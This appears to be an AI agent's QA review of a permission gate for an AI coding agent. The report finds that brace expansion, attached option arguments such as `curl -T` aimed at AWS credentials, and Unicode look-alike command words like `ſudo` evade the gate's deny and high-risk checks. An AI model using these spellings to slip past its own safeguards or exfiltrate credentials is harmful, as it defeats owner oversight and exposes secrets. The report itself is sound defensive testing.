NO GO at 0e7f83f

# QA gate M2-POLICY, round 3 (delta gate `379332d..0e7f83f`, branch `m2-policy` @ 0e7f83f141baca4c9b2fc0af6f594a0acdbfb897)

Independent tier-1 read, 2026-11-17. Findings only: nothing fixed, committed or pushed. I did not write this code and did
not run rounds 1 or 2. My clone: `/private/tmp/claude-501/-Volumes-Laptop-DEV-FRIDAY/1d34e9cf-ed94-49aa-ba4c-99451dcbbc42/scratchpad/gate_m2_policy_r3/repo`
(HEAD confirmed 0e7f83f…). Attack tests, probes, the mutation script and logs are in `gate_policy_tests_r3/` beside
this file. Each attack test asserts the SAFE outcome; a failing test is a finding.

## Headline

**The removal is real.** No text of a `Bash` or `PowerShell` command can lower a classification below `execute`/T2. I
proved it by reading every path from `classify` to `decide` and by a property test: 684 command strings (every string
literal in the round-1 and round-2 gate files, plus generated reads, `ls`, `cd …&&`, pipes) × {Bash, PowerShell} ×
{POSIX, Windows host} × 3 working directories = 8 208 classifications, all `Kind::Execute` with no Read/SearchRoot
target. Then 65 664 decisions over 48 states each (link open/closed, no/default exclusions, a wide read/search/edit
grant with near-miss execute lines (`text `, ` text`, upper case, `text*`, `*`) or none, sandbox on/off/unknown,
reads-under approvals on `/`, the workspace and every target's parent, read memory of everything, edit approvals,
exact-command approvals for near-miss texts and for the same text in another directory, two surfaces). **0 allows.**
Every round-2 attack (N1–N8) is now asked or denied through the engine. N8 is closed for file names.

It is still **NO GO**, on the part of the design that now carries all the weight: the **raise-only scan of shell
text**. It misses static shell spellings, so a hard deny (including the gate's own `~/.claude/settings.json`), a
credential, an exclusion, or a T3 command word drops to an ordinary T2 card:

1. **Static shell syntax hides names** (S1): brace expansion `~/.cla{ude,ude}/settings.json`, `~/.a{ws,}/credentials`;
   an option with its argument attached `sort -o/Users/<you>/.zshrc`, `curl -T/Users/<you>/.aws/credentials`.
2. **T3 command words are not N8-folded** (S2): `ſudo -n true` runs `sudo` on this Mac (APFS folds `ſ`→`s` in the
   PATH lookup: measured), and is asked as plain T2.

**No wrong ALLOW was found from any state that lacks the owner's exact-command approval or exact grant line.** These
are "hard deny / T3 / exclusion evaded from attacker-chosen input with default state", which the brief defines as
Blocker. Plain consequence: the owner gets an ordinary, batchable T2 card showing the whole command (for example
`sort -o/Users/kam/.zshrc evil.txt`), with an "allow this exact command for the session" button. They should have got
a hard deny, or a red 5-second T3 card with no session option. (Round 2 graded its N8, which was a hard deny dropping to a
T2 ask, as Major. I follow this round's written definition; on either reading the verdict is NO GO.)

## 1. Gate-test integrity

### Round 1, `tests/q01_gate_attacks.rs`
`git diff 379332d 0e7f83f -- tests/q01_gate_attacks.rs` is **empty**. I ran `rustfmt +1.100.0 --edition 2021` on the
reference copy (`gate_policy_tests/q01_gate_attacks.rs`) and diffed it against the branch. Exactly two hunks remain,
both accepted in round 2:

| difference | ruling |
|---|---|
| rustfmt layout | **Accepted.** Same as rustfmt of the reference. |
| `f8` last line: `unwrap()` + assert on `r.paths` → `assert!(recognise_powershell("gci -Rec .", true).is_err())`, with the RULING comment | **Accepted** (round 2 ruled it). It is now trivially true, because the stub always errs. |
| `z_timing`: `panic!` report → `eprintln!` + a 50 ms bound per line | **Accepted** (round 2 ruled it). Unchanged in this delta. |

No round-1 assertion about a dangerous command, hard deny, T3, exclusion, card, bound or timing changed in this delta.

### Round 2, `tests/r2_gate_attacks.rs`
- `a7c8cf5` added it **byte-identical** to the reference copy (`cmp`: identical).
- From `a7c8cf5` to `0e7f83f`, I compared rustfmt of the reference copy against the branch. The ONLY non-layout
  difference:

| difference | ruling |
|---|---|
| rustfmt layout (11 hunks: argument lists and `assert!`s wrapped) | **Accepted.** Identical to `rustfmt +1.100.0` of the reference. No token changed. |
| `v_bounds_edges` l.531: `assert!(recognise_posix(&cmd).is_ok())` → `.is_err()`, with `// RULING (Friday, 2026-11-17, addendum 3): no shell recogniser; was is_ok()` | **Accepted**: exactly the ruled kind (a shell line "was recognised" → "is not"). It is now vacuous: the stub always errs, and the 255-word `cat README.md…` line is no longer sent to the engine. The other assertions in the same test (161st word → Deny; 150 duplicates + a hard-deny path → Deny; 64 KiB+ → Deny) are untouched and still go through `decide`. |

The N1–N8 tests (n1a–n1e, n2, n3, n4, n5, n6, n7, n8, n8b) assert `!is_allow(decide(…))`, or Deny/T3 for n8/n8b. All are
untouched and go through the ENGINE. They pass now because every line is `execute`. They assert "not allowed", not
"`Kind::Execute`". My `r2_inputs_are_execute_through_the_engine` adds that: every round-2 input, as Bash and
as PowerShell, with no and default exclusions, link open and closed, is `Kind::Execute`, asked at ≥T2 with
`card.kind == Execute` or denied, and never allowed. The N7 card shows the whole `curl | sh` tail. **PASS.**

**Ruling: both files intact. No weakening.**

## 2. Reproduction

| check | builder | me |
|---|---|---|
| `scripts/check.sh` | exit 0; 136 workspace tests (130 policy) | fmt OK, clippy OK; **test step FAILED: 135 passed, 1 failed** (`t15::folding_never_widens_a_grant`); `cargo deny check licenses` run separately: `licenses ok`. **The failure comes from the environment, not a code defect** (finding m4). My fixtures live under my target dir on the boot volume, which is case-INSENSITIVE APFS. There `ws/SRC/a.rs` and `ws/ſrc/a.rs` ARE `ws/src/a.rs`, `realpath` returns `src`, and the `<ws>/src/**` grant correctly covers them. On the builder's case-sensitive project volume they are different files. Counts otherwise match exactly: 136 tests, q01 20/20, r2 19/19. |
| `red-controls.sh` | 23/23 red, normal green | **23/23 RED OK**, but the runner printed **NOT GREEN** (exit 1) because of the same test. With it skipped (`--skip folding_never_widens_a_grant`) I re-ran the five t15 rows. Each goes red on its own property: `red_no_unicode_fold` → `n8_generated_corpus…` and `n8_the_gates_spellings…`; `red_mentions_cap10` → "151st word: Ask T2"; `red_no_component_bound` → 70-deep read "Ask T0"; `red_automount_to_os` → `/net/host/x: Certain`; `red_free_text_100` → Agent prompt "Ask". In the runner's own log, three of those rows quote the wrong first panic (`SRC/a.rs`). They were red for the wrong reason in my environment. The 16 kept rows' first panics name their properties. Both `red_shell_text_lowers` rows: t13 on `cat … \| sort …`, t15 on `"cat README.md"`. |
| removed red rows | 6 removed with an explanation | **Accepted.** The runner names the six (`red_lexer_allows_dollar`, `red_lexer_allows_redirect`, `red_find_allows_exec`, `red_cd_semicolon`, `red_allowlist_open`, `red_git_is_read`), says why, and says where the code went. The features are gone from `Cargo.toml`. Not silent. |
| Windows clippy `cargo +1.100.0 clippy -p coagent-policy --locked --offline --target x86_64-pc-windows-msvc -- -D warnings` | clean | **clean** (exit 0) |
| scope `git diff --stat 379332d..0e7f83f` | — | 35 files. Everything is under `crates/coagent-policy/` plus `docs/POLICY.md`, `BACKLOG.md`, the root `Cargo.toml` (one dependency line) and `Cargo.lock` (+16: `unicode-normalization 0.1.25`, `tinyvec 1.13.3`). No other crate, no `spikes/`, no CI. **OK.** |
| quarantine not compiled | — | **Confirmed.** No `build.rs` anywhere; no `#[path]`, `include!` or `mod` reaches `_quarantine_2026-11-17_shell-recogniser/`. Its `src/` is not the crate's `src/`, and Cargo's auto-discovery only looks at `src/`, `tests/`, `examples/` and `benches/`. No feature mentions it. The only `include_str!` in tests is `fixtures/option_spellings.txt`. The only non-test uses of the stubs are their own unit test. `lib.rs` still has `#![forbid(unsafe_code)]`. |
| stubs uninhabited | — | **Confirmed.** `shell/mod.rs:15` `recognise_posix(&str) -> Result<Infallible, &'static str>`, and `:22` `recognise_powershell(&str, bool) -> Result<Infallible, …>`. `ShellClass` has ONE variant, `Execute { why }`. |

### Dependency
- `unicode-normalization =0.1.25`: MIT OR Apache-2.0. `#![deny(unsafe_code)]` crate-wide, with three
  `#[allow(unsafe_code)]` sites, all Hangul (de)composition: `char::from_u32_unchecked` on arithmetic bounded by the
  Hangul ranges. It turns on `tinyvec` `alloc`.
- `tinyvec 1.13.3`: Zlib OR Apache-2.0 OR MIT, `#![forbid(unsafe_code)]`.
- Default features: `unicode-normalization`'s `default = ["std"]` is not needed (`.nfkc()` works with `alloc` only). It is
  harmless; `default-features = false` would trim it (Note n6).
- `cargo deny check licenses`: ok. Both crates resolved offline from the local cache.

## 3. Round-2 findings

| finding | status | how |
|---|---|---|
| N1 `cd ..` logical vs physical | **CLOSED** | ran: r2 n1a–n1c pass through `decide`; my p3 includes the same lines from a symlinked cwd (`ws/l`); all execute, 0 allows. The logical-`..` class reappears only for exact-command approvals reused via a symlinked cwd (m1). |
| N1′ `/tmp` symlink | **CLOSED** | ran (r2 n1d/n1e; p3) |
| N2 ugrep `--include` with `/` | **CLOSED** | ran (r2 n2; my r2_inputs) |
| N3 `"$?[PATH=7]"` | **CLOSED** | ran |
| N4 `tail +1f` | **CLOSED** (asked, T2) | ran |
| N5 option after operand | **CLOSED** | ran |
| N6 pwsh `ls -Filter` on POSIX | **CLOSED** | ran: PowerShell on POSIX and Windows hosts is execute (p3) |
| N7 card truncation | **CLOSED** | ran: `card.command` is shown whole (`visible_whole`). Residue: the "this exact command: …" button label is still cut at 1 000 characters (Note n4). |
| N8 Unicode folding of file names | **CLOSED for path components, WITH A NEW ISSUE (S2)** | ran: builder corpus 2 152/2 152, plus my f6a (Write, Read, and shell `cp` to `.zſhrc`, `.bash_proﬁle`, `.claude/ſettings.json`, `.ſſh/authorized_keys`, `.doc<KELVIN>er/config.json`, `.git-credentialſ`, `.git/hoo<KELVIN>s/pre-commit`, `Makeﬁle`), all denied or T3. New: the T3 COMMAND WORDS of shell text are not folded (S2). |
| N9 "write it to a file" | **CLOSED** | read: now "split it into smaller commands, each shown to the owner in full" |
| N10, N11, N12 | moot (recogniser removed); N11 aliases are now covered by POLICY §5 "trusts everything the shell does" | read |
| N13 T3 list gaps | **CLOSED** (17 names added: `Cargo.toml`, `.yarnrc.yml`, `.pnpmfile.cjs`, the `*.config.*` files, `tox.ini`, `pytest.ini`, `setup.cfg`, `justfile`, `Taskfile.yml`, `docker-compose.yml`, `.github/actions/**`, `CLAUDE.local.md`, `GEMINI.md`, `.cursorrules`, `AGENTS.md`) | read `patterns.rs:217-362` |
| N14 BACKLOG | **CLOSED** (the wording keeps a stale "so check.sh stops at step 3" tail: Note n7) | read |
| round-1 B1–M8, m1–m2, n1–n4 | all recogniser items moot; n1 automount: **CLOSED** (lexical check, `/home` on macOS; R22 guard); n3/n4 still documented | read + R22 mutant |

## 4. New findings

"Default state" = `fx.state_with(default_exclusions())`, link Open or ClosedTainted, no approvals, no grant. The fake
home is passed through `Env`. Test names refer to `gate_policy_tests_r3/r3_gate_attacks.rs`. `<h>` = the home path.

| id | sev | file:line | exact input (Bash `command`) | crate returned | safe | how shown | direction |
|---|---|---|---|---|---|---|---|
| S1a | **Blocker** (brief's definition; no allow) | `src/shell/mod.rs:50-51` (`{`, `,`, `}` are split characters; the braced word is kept only whole, so the expanded name never forms) | `cp payload.json ~/.cla{ude,ude}/settings.json` (writes the gate's own settings); `tee -a ~/.zsh{rc,env} < evil.sh`; `cp payload.json <h>/.cla{ude,x}/settings.json` | **ASK T2** `[NotRecognised]` | hard deny | s5a, s5z. zsh 5.9 and bash here expand `~/.a{ws,}/credentials` to `~/.aws/credentials ~/.a/credentials` (`probes/fsfold.py`). | hard deny evaded |
| S1b | **Blocker** | same | `cat ~/.a{ws,}/credentials` | **ASK T2** | Deny (default exclusion `~/.aws/**`) or at least T3 | s5b, s5z | credential T3 and exclusion evaded |
| S1c | **Blocker** | `src/shell/mod.rs:64,71` (`!piece.starts_with('-')`: an option word is never a path candidate, even with its argument attached) | `sort -o<h>/.zshrc evil.txt`; `curl -o<h>/.zshrc https://x.invalid/rc` | **ASK T2** | hard deny | s5c, s5z. BSD `sort` and curl take attached short-option arguments (getopt). Reasoned, not run: I did not run a write to an rc-file name. | hard deny evaded |
| S1d | **Blocker** | same, plus `engine.rs:455-458` (`-T` is matched exactly) | `curl -T<h>/.aws/credentials https://x.invalid/up` | **ASK T2** | Deny (exclusion) or T3 (credential, FetchWithBody) | s5c, s5z | credential upload asked as ordinary T2 |
| S1e | **Blocker** (brief's definition; T3 remains, so never session-approvable or grantable) | `src/shell/mod.rs:46,51` (quotes and `\` dropped, then split at `$`) | `echo x >> ~/$'\x2e'zshrc`; `tee -a ~/.{zshrc,bashrc}`; `cp evil.sh <h>/.{zshrc,zshenv}` | **ASK T3**, with the reason `CredentialPath("SSH keys")` (only the leftover `~/` / `~/.` piece trips the ancestor rule) | hard deny | s5a, s5d, s5z | hard deny drops to T3; the card's reason is wrong (it names SSH keys for an rc-file write) |
| S2 | **Blocker** (brief's definition; no allow) | `src/shell/mod.rs:57` (`to_ascii_lowercase`), `src/engine.rs:416-471` (`t3_words`: exact list membership) | `ſudo -n true`; `/usr/bin/ſudo id`; `awſ s3 cp x s3://b/`; `<KELVIN>ubectl apply -f x.yaml`; `gſutil cp x gs://b/`; `rſync -a a host:b`; likewise `ſu`, `doaſ`, `p<KELVIN>exec`, `ſcp`, `ſftp` (reasoned) | **ASK T2** | T3 | s5e, s5z. **Measured:** zsh and bash on this Mac ran a harmless probe script `sudoprobe` when invoked as `ſudoprobe` through PATH (APFS on the boot volume folds `ſ`→`s`, Kelvin→`k`, `ﬁ`/`ﬆ`/`ß`/`ẞ`; `probes/fsfold.out`). `/usr/bin` and `/opt/homebrew` are on that volume. NTFS's upper-case table maps `ſ`→`S` too (reasoned). | T3 evaded: privilege escalation and cloud CLIs as batchable T2 with a session option |
| m1 | Minor | `src/engine.rs:631-644` (ExactCommand compares the CANONICAL cwd only) | approve `cd .. && ls` in `ws/deep/real`; run the same text with hook `cwd` = `ws/link` (→ `ws/deep/real`) | **Allow{SessionApproval ExactCommand}** | not covered: the logical `..` of `ws/link` is `ws`, not `ws/deep` (round-2 N1) | x4c | an approved text does something other than what was approved. Needs an owner approval of a `..`/`$PWD`-relative command plus a cwd through a symlink (the agent changes cwd with an approved `cd`). Fix: bind the raw cwd as well. |
| m2 | Minor | `src/shell/mod.rs:51` (`$` is a separator, so `$HOME` → relative word `HOME`) | `grep -r aws_secret_access_key $HOME`, also `"${HOME}"` | ASK **T2** | T3 (`grep -r … ~` is T3) | s5g | the new ancestor rule misses its most common spelling. Parameter expansion is arguably "built at run time" (out of scope), but the scan already maps `$HOME/.claude` by name. |
| m3 | Minor | `src/engine.rs:274-277` (recursive roots check anywhere-patterns only with `anywhere_below`) + `action.rs:276-285` (the Grep `glob` field is ignored) | Grep tool `{"pattern":"TOKEN","glob":".env*","output_mode":"content"}`, link ClosedTainted, exclusions **empty** | **Allow{PostSessionRead}** (Read of `.env` in the same state: T3) | T3 when `glob`/`type` or a Glob `pattern` names a credential anywhere-pattern | f6c | credential contents read without asking, but only if the owner removes the default exclusions. POLICY §10.4–5 documents the design; with default exclusions it is asked (f6b). |
| m4 | Minor (test quality) | `tests/t15_addendum3.rs:263-290` | run the suite with the fixture dir on a case-insensitive volume (any clone outside the project volume) | test fails; `red-controls.sh` exits 1 ("NOT GREEN") and three t15 rows quote the wrong first panic | the assertion should depend on the volume (or create the fixture on a case-sensitive image) | reproduction | false red in CI and on any normal Mac; it hides the red-control proof for three rows |
| m5 | Minor (owner-facing) | `src/glob.rs:327-329` (`components_may_intersect` (glob, glob) → true unless a dot rule) + exclusion by name (`engine.rs:290-295`) | `wc -l src/*.rs`; `find . -name '*.rs'`; `git commit -m "read .env before start"`; `echo 'see .env for setup' > NOTES.md`; `cat .env.example` | **DENY** "a target is on the owner's exclusion list" | ask, or T3 | s5k: of 79 ordinary developer commands under default exclusions, **14 DENIED, 11 T3, 54 T2, 0 allowed** | any shell glob is refused outright (`*.rs` "could match" `*.pem`), with no way for the owner to approve, and the reason tells agent and owner that an excluded file was named. Safe direction, but it trains everyone to ignore the gate. |
| m6 | Minor (card wording) | `src/engine.rs:971-973`, `shell::NO_RECOGNISER` | `ls` | card: `classified_as: "execute (no shell-command recogniser in the gate: every shell command is execute)"` | say what it means: "a shell command can read, change or run anything; the gate only checks for the names it lists" | s5i | the card does not claim harmless (good), but it speaks to the implementer, not the owner |
| n1 | Note | `src/grant.rs:285-293` | grant execute lines `"npm test *"`, `"git *"`, `"*"` | **installed silently**; they match only the literal text (fail-closed) | refuse a line containing `*`, or warn on the grant card | x4e | an addendum-1 grant keeps loading and silently matches nothing |
| n2 | Note | `src/glob.rs:78-86` (fold changes LENGTH: `ß`→`ss`, ligatures) | owner exclusion `<ws>/report?.pdf`, Read `ws/reportß.pdf` | ASK T0 (not excluded) | a `?` should match one visible character | f6d | owner patterns with `?` only. On APFS, `reportß.pdf` is the same name as `reportss.pdf`, so the expected answer is debatable. |
| n3 | Note | `src/engine.rs:631-644` | `{"command":"npm test","run_in_background":true}`, `timeout`, `description`, and the non-existent `env`/`shell` fields | allowed by the ExactCommand approval | fine for Claude Code's current Bash schema (none of these changes what runs); `dangerouslyDisableSandbox: true` → T3 (x4a) | x4a, x4b | a future execution-affecting Bash field would not be bound |
| n4 | Note | `src/state.rs:38-43` | command > 1 000 chars | the "this exact command: …" option label is truncated | the label is not the action; the card's command field is whole | reading | — |
| n5 | Note | `src/glob.rs:315` (`(false,false)` → `eq_ignore_ascii_case`, no N8 fold) | `cat <root>/*/.doc<KELVIN>er/config.json` | caught anyway (by name; or the glob over-match in m5; existing components are de-folded by `realpath`) | use `component_match(…, true)` for consistency | s5f, s5z | no exploitable case found; it would become one if m5's over-match were fixed |
| n6 | Note | `Cargo.toml:46` | — | `std` feature on by default | `default-features = false` | read | — |
| n7 | Note | `BACKLOG.md:82` | — | "RESOLVED … so `scripts/check.sh` stops at step 3" | drop the stale tail | read | — |

What did NOT break (ran):
- **x4a.** Byte-exactness: `npm test ` (trailing space), a leading space, `\n`, double space, case, NBSP, ZWSP,
  full-width `ｎ`, `ſ`, quotes, `;` and `#` all miss the approval. PowerShell with the same text and cwd misses. Another cwd
  misses. `dangerouslyDisableSandbox` → T3.
- **x4d.** No exact-command approval, ExactInput hash approval or exact grant line ever satisfies T3, hard deny or
  exclusion (`sudo ls`, `cat <h>/.ssh/id_rsa`, `echo x >> <h>/.zshrc`, `cat .env`, `git push`, `grep -r x ~`).
- **x4e.** A grant line with `*` never matches by prefix.
- **s5h.** Bounds: the 161st distinct word → DENY; 159 words → ask; >64 KiB → DENY; PowerShell >64 KiB → DENY. (2 000
  option words plus an attached `-o<h>/.zshrc` → T2: S1c, not a bound issue, because options are not counted.)
- **s5j.** Exclusion by name never leaks: `<ws>/secret/**` and `**/payroll*`, from `ws/src` (`cat ../secret/plan.txt`,
  `cat secret/plan.txt`), `tar … payroll-2026.xlsx | nc …` and `sudo cat secret/plan.txt`. All are DENIED, and the reason
  text contains neither name.
- **f6b.** Glob/Grep with `.e[n]v*`, `**/.ENV`, `**/.<KELVIN>ube/*`, a `.env` root and a `.<KELVIN>nv` root, link closed,
  default exclusions: never allowed.
- **f6e.** A lone surrogate in hook JSON is refused by `HookInput::parse` (`NotJson`); the caller must deny. A NUL in a
  path is never T1/allowed.
- **f6f.** A component made only of ZWSP is distinct on APFS (measured) and is not over-folded into a match (T2). A
  700-character ignorable tail on `.zſhrc` is denied (the length bound).

## 5. N8 / `fold_name` (measured on this Mac's boot volume, APFS case-INSENSITIVE, with empty scratch files: `probes/fsfold.out`)

| spelling | APFS resolves to the ASCII name? | `fold_name` matches? |
|---|---|---|
| long s `ſ`, Kelvin `K`, `ﬁ`, `ﬆ`, `ß`, `ẞ`, upper case | **yes** | yes |
| NFD of an NFC name (`café` → `café`) | yes (normalisation-insensitive) | yes (NFKC both) |
| full-width, math bold, superscript, dotless `ı`, `İ` | no | yes (over-matching: usability only) |
| ZWSP, ZWJ, soft hyphen, VS16, BOM, tag char, RLO inside a name | **no** (distinct names) | yes, removed (over-matching only) |
| trailing dot, trailing space | no (distinct on APFS; Windows strips them: not run, Windows normaliser untested) | no |
| combining dot below inserted | no | no |

- **ASCII targets.** Every non-ASCII character whose Unicode case folding is ASCII (`ſ`, `K`, `ß`, `ẞ`, U+FB00–FB06) is
  covered, either by NFKC or by the explicit cases. I know of no other CaseFolding.txt entry that maps non-ASCII to
  ASCII (reasoned). Cherokee and other non-ASCII owner patterns are uncovered, as the builder says.
- **Case-sensitive APFS** (the project volume) folds nothing for case; it only normalises. **HFS+** (reasoned): it
  folds case with its own table and ignores some of U+200C–200F, U+202A–202E, U+206A–206F and U+FEFF. `fold_name`
  removes all of these.
- **Invalid UTF-8 or lone surrogates** cannot arrive: hook input is JSON, which `HookInput::parse` rejects. A
  non-UTF-8 canonical path is Uncertain, never T1 (`path/mod.rs:217,268`).
- **Folding everywhere.** Every PatternSet index key is folded on both sides (`rules.rs:57,234`). Canonical, lexical and
  raw spellings all go through `component_match`, which folds for any non-ASCII input (`glob.rs:78`). Symlink-resolved
  canonical paths go through it too. A pattern is never matched against an unfolded WHOLE path; matching is always per
  component. **One place does not fold:** `components_may_intersect` (literal, literal) (n5).
- **The same fold is NOT applied to T3 command words (S2).**

## 6. Mutation testing (fresh, on the delta; one at a time; the builder's FULL crate suite with my file removed; the environment-red `folding_never_widens_a_grant` subtracted as baseline)

| mutant | result |
|---|---|
| M1 PowerShell `Get-Content` falls back to a Read target | caught (`every_tool_in_the_table`, `powershell_parameter_prefixes_are_execute`) |
| M2 no Unicode fold in `component_match` (old per-character lower-case) | caught (r2 n8/n8b, t15 corpus, t15 spellings) |
| M3 fold only the candidate | caught (t15 corpus, t15 spellings) |
| M4 / M4b default-ignorables kept in ONE of the two passes | SURVIVED, **equivalent** (the other pass removes them) |
| M4c default-ignorables kept in BOTH passes (run by hand) | caught (t15 corpus) |
| **M5 exact-command match case-insensitive** | **SURVIVED** (no builder test sends `NPM test` against an approval of `npm test`; my x4a does) |
| M6 exact-command ignores the cwd | caught (`exact_command_scope`) |
| M7 exact-command ignores the tool | caught (`mutant_guards`) |
| M8 hash omits the cwd | caught (hash unit test) |
| M9 over MAX_MENTIONS passes as T2 | caught (t14 m6, r2 v_bounds_edges) |
| M10 over 64 KiB passes as T2 | caught (t14 m6, r2 v_bounds_edges) |
| M11 no ancestor-of-credential T3 | caught (t06) |
| M12 grant line `*` matches by prefix | caught (t09, grant unit test) |
| M13 exclusions not matched by name in shell text | caught (t14 `m2_cd_rules`) |
| M14 hard deny not matched by name in shell text | caught (t05) |
| M15 privilege words not T3 | caught (t06) |
| M16 `dangerouslyDisableSandbox` ignored | caught (t09, t06) |
| M17 T3 execute reachable by an approval or grant | caught (t06, t09) |
| **M18 a grant execute line also matches PowerShell** | **SURVIVED** (POLICY §10.11 promises "never grant-matched on any host"; no test) |
| M19 quoted/escaped whole words not scanned | caught (shell unit `scan`) |
| M20 MAX_MENTION_COMPONENTS bound dropped | caught (t15 `words_times_depth_bound`) |
| M21 `ß`→`ss` dropped | caught (t15 corpus) |
| M22 grant scopes folded (allow side widened) | SURVIVED **in my environment only**: the guard `folding_never_widens_a_grant` is already red here (m4). On a case-sensitive fixture volume it should catch it (reasoned). |
| R4 find `-newer` operand | removed with the recogniser |
| R8 pipeline stages 2+ not tiered | removed with the recogniser |
| R11 mentions checked to 10 words | **now caught** (t15 r11, r2 v_bounds_edges) |
| R16 filter grep `-r` stdin-only | removed with the recogniser |
| R17 component bound dropped (realpath branch) | **now caught** (t15 r17) |
| R22 automount prefixes reach the OS | **now caught** (t15 r22) |
| R24 free text checked to 100 chars | **now caught** (t15 r24) |
| M14′ memory allows recursive reads | SURVIVED, **equivalent** now: no `Kind::Read` action has a recursive target (Read, NotebookRead and LS are non-recursive; Glob and Grep are `Search`) |

**Totals:** 28 mutants run by the script plus M4c by hand. 22 caught. 2 real survivors: **M5** and **M18**. 1
environment-masked (M22). 3 equivalent (M4, M4b, M14′). Of round 2's eight survivors, four are now caught (R11, R17, R22,
R24), three went with the recogniser (R4, R8, R16), and M14′ is equivalent. After every mutant the source was
restored byte for byte; `git status --porcelain` was empty at the end.

## 7. Owner-facing consequence (plain words, for the card)

With no shell recogniser, **every command the agent runs in a terminal stops and asks you**. That includes `ls`, `git status`,
`cargo test` and `npm test`. Nothing in a shell command is ever let through on its own. What keeps a session usable:

1. **The agent's own Read, Glob, Grep and LS tools** are unaffected. Reading files the normal way stays quiet: allowed
   by read memory, "reads under this folder", or a read grant.
2. **"Allow this exact command for this session"** on a T2 card. It covers only that byte-for-byte text, in that
   folder, from the Bash tool. `cargo test` approved once runs again silently. `cargo test foo` asks again.
3. **Grant lines** (`execute` scope) are exact command texts. `*` is not a wildcard any more, and old wildcard lines
   load silently and match nothing (n1).

What the card should add:
- **Approving a shell command trusts everything it does.** That includes reading excluded files, aliases, and whatever
  programs it starts.
- **With the default exclusions on, any shell command with a file wildcard, or one that mentions `.env`, a `.key`/`.pem`
  file or `id_ed25519`, is REFUSED outright, and you cannot approve it** (m5). In my sample of 79 ordinary developer
  commands: 14 refused (`wc -l src/*.rs`, `find . -name '*.rs'`, `git commit -m "read .env …"`), 11 red T3 cards
  (`cat package.json` and `cat Cargo.toml` are T3 because those files are "edits that become execution"), 54 ordinary
  asks, 0 automatic. Expect the agent to switch to its Read/Grep tools, and expect many prompts.
- **The protective name checks on shell text can be dodged** by ordinary shell spellings (S1, S2) until fixed. A shell
  card is a full-trust decision: read the whole command.
- A gate that prompts on every command gets approved without reading. That is a product risk as large as any finding
  here.

## 8. What I did not examine

- GNU/Linux shells and tools, pwsh, and Windows at run time. The Windows normaliser is untested, as the builder says.
  NTFS folding of `ſ` is reasoned.
- I did not RUN any command that writes an rc-file name or reads a credential. Attached-argument parsing for `sort -o…`
  and `curl -T…` is reasoned from getopt. Brace expansion was run with `printf` only. The `ſudo` exec lookup was run with a
  harmless probe script in my scratch dir.
- Whether Claude Code's Bash tool accepts extra input fields (n3), and how it sets the hook `cwd` (logical or physical:
  this decides m1's reach).
- Free-text (InText) exclusion matching is not done by name. An Agent prompt naming an excluded path relative to
  another directory could put the name on a card. Reasoned only; this is outside the delta.
- A fuzz run; design docs 03/04; t03/t13 counts beyond seeing them pass.
- Owner patterns with non-ASCII characters beyond the builder's cases.

## 9. My slips

- My first `rustfmt` run used the default stable toolchain, which has no rustfmt. I re-ran with `+1.100.0` and needed an
  empty `common.rs` beside the copy so that `mod common;` resolved.
- I first wrote my test file into `tests/` while check.sh was running in the background. I moved it out within
  seconds. check.sh's test step had not started (the logs show the builder's 136 tests only), but the timing was not
  guarded.
- One `rm -f` of my own log was refused by the no-delete hook (it used `$S`). I dropped it.
- f6a first asserted that a write to `ws/ſecret/plan.txt` is denied or T3 with only the DEFAULT exclusions. That was my
  error (no `secret` exclusion was set). I removed that entry.
- My first parser for the red-row re-run grepped `^test … FAILED`, which `--nocapture` interleaving hides. I re-read the
  full output: `red_no_unicode_fold` did go red on its corpus test.
- s5f (Kelvin + glob) PASSED. On this volume, `realpath` de-folds an existing component to its on-disk ASCII name, and
  the glob over-match (m5) catches the rest. I downgraded that line of attack to Note n5.
- Fixture artefact: my fake home lives under `/private/tmp/…`, so `/tmp/` in `ſcp a host:/tmp/` counts as an ancestor
  of the fake home (T3 in the survey). On a real home `/Users/<you>` the same command is T2.
